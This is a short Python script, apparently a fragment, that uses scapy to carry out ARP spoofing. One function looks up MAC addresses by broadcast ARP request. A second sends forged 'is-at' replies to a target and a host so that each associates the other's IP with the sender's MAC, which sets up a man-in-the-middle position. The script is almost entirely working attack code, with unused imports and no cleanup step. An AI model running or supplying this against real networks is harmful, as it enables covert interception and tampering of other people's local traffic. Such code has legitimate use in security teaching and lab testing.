from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys


def get_mac(ip):
    """
    Fetch the mac address of an ip
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip):
    """
    Spoofs the ARP Response for both the client and the host
    """
    # Find the addresses of both the target and host
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    # Send the ARP Response, for both sides
    target_arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    host_arp_respone = ARP(pdst=host_ip, hwdst=host_mac, psrc=target_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(target_arp_response)
    send(host_arp_respone)
    
    # Fetch our mac address and print to console
    local_mac = ARP().hwsrc
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, local_mac))